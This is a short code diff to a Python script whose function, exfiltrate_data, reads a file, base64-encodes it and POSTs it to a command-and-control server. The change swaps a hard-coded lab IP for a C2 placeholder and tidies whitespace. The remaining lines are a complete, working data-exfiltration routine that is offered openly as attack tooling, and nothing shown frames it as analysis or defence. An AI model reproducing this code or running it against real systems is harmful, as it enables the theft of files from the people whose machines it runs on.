@@ -24,11 +24,11 @@ def exfiltrate_data(file_path, c2_url):
         encoded_data = base64.b64encode(f.read()).decode()
         payload = {'file': encoded_data}
         response = requests.post(c2_url, json=payload)
-    
+
     return response.status_code
 
 if __name__ == "__main__":
     file_path = "/path/to/file"
-    c2_url = "http://10.0.2.4:8000/exfiltrate"
+    c2_url = "http://C2_IP_OR_URL/exfiltrate"
     status = exfiltrate_data(file_path, c2_url)
     print(f"Exfiltration status: {status}")
